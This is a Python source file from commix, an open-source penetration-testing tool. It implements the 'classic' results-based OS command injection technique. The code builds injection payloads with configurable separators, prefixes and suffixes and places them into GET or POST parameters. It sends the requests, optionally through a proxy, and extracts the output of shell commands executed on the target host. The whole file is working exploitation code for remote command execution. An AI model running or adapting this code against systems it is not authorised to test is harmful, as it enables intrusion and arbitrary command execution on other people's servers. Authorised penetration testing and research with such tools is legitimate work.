#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.results_based.techniques.classic import cb_payloads


"""
  The "classic" technique on Result-based OS Command Injection.
"""

#-----------------------------------------
# Check if target host is vulnerable.
#-----------------------------------------
def injection_test(payload,http_request_method,url):
  		    
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)
      
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the POST data
    data = re.sub(settings.INJECT_TAG, payload, parameter)
    request = urllib2.Request(url, data)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter,url)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
      opener = urllib2.build_opener(proxy)
      urllib2.install_opener(opener)
      response = urllib2.urlopen(request)
    except urllib2.HTTPError, err:
      print "\n(x) Error : " + str(err)
      sys.exit(1) 
  else:
    response = urllib2.urlopen(request)
      
  return response,vuln_parameter

 
#-------------------------
# Evaluate test results.
#-------------------------
def injection_test_results(response,TAG):
  
  html_data = response.read()
  shell = re.findall(r"" + TAG + TAG + TAG + "", html_data)
  
  return shell


#----------------------------------------------
# # The main command injection exploitation.
#----------------------------------------------
def injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter):
  
  # Execute shell commands on vulnerable host.
  payload = cb_payloads.cmd_execution(separator,TAG,cmd)
  
  if separator == " " :
    payload = re.sub(" ", "%20", payload)
  else:
    payload = re.sub(" ", whitespace, payload)

  # Check if defined "--prefix" option.
  if menu.options.prefix:
    prefix = menu.options.prefix
    payload = prefix + payload
  else:
    payload = prefix + payload
    
  # Check if defined "--suffix" option.
  if menu.options.suffix:
    suffix = menu.options.suffix
    payload = payload + suffix
  else:
    payload = payload + suffix
      
  # Check if defined "--verbose" option.
  if menu.options.verbose:
    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
    
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    target = re.sub(settings.INJECT_TAG, payload, url)
    vuln_parameter = ''.join(vuln_parameter)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)	
      
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
	proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	opener = urllib2.build_opener(proxy)
	urllib2.install_opener(opener)
	response = urllib2.urlopen(request)
			
      except urllib2.HTTPError, err:
	print "\n(x) Error : " + str(err)
	sys.exit(1) 

    else:
      response = urllib2.urlopen(request)
      
  else :
    # Check if defined method is POST.
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    data = re.sub(settings.INJECT_TAG, payload, parameter)
    request = urllib2.Request(url, data)
    
    # Check if defined extra headers.
    headers.do_check(request)
      
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
	proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	opener = urllib2.build_opener(proxy)
	urllib2.install_opener(opener)
	response = urllib2.urlopen(request)
			
      except urllib2.HTTPError, err:
	print "\n(x) Error : " + str(err)
	sys.exit(1) 

    else:
      response = urllib2.urlopen(request)
      
  return response

#-----------------------------
# Command execution results.
#-----------------------------
def injection_results(response,TAG):
  
  # Grab execution results
  html_data = response.read()
  shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + "", html_data)
  
  return shell


#eof